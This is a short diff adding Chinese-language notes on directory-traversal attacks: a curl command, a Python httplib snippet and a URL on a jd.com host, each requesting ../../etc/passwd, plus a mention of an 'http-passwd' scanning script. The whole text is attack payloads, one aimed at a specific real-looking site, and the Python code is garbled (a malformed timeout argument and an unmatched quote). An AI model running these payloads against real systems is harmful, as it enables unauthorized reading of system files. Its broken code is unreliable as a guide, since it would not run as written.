@@ -1,0 +1,9 @@
+1、curl http://lochost/../../../../etc/password
+2、python 脚本
+   import httplib
+   conn = httplib.HTTPConnection(host,timeout-=20)
+   conn.request('GET',/../../../../../../../../../etc/passwd' )
+   html_doc = conn.getresponse().read()
+3、利用http-passwd
+
+http://jme.jd.com/file/download?fileName=../../../../../etc/passwd
